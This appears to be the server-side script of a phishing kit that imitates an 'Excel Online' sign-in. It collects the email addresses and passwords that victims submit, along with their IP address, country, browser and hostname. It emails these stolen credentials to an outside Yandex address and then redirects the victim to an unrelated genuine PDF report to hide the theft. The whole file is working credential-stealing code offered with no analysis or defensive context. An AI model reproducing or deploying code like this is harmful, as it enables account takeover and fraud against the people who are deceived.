<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Rec||Data-----------------------\n";
$message .= "Email Address:     ".$_POST['igmanmaerues']."\n";
$message .= "Email Password:   ".$_POST['igmawrdoaspp']."\n";
$message .= "-------------Rec||Info-----------------------\n";
$message .= "|Encoded IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Encoded Browser                :".$browserAgent."\n";
$message .= "Encoded DateTime                    : ".$timedate."\n";
$message .= "Encoded country                    : ".$country."\n";
$message .= "Encoded HostName : ".$hostname."\n";
$message .= "-------------Thor||Hemsworth---------------\n";

$send = "bossmeme@yandex.com";
$subject = "Result from excel online";
$headers = "From: Excel Online<en@coded.co.uk>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);

 }
    header("Location: http://www.doingbusiness.org/~/media/WBG/DoingBusiness/Documents/Annual-Reports/English/DB15-Full-Report.pdf");
  

?>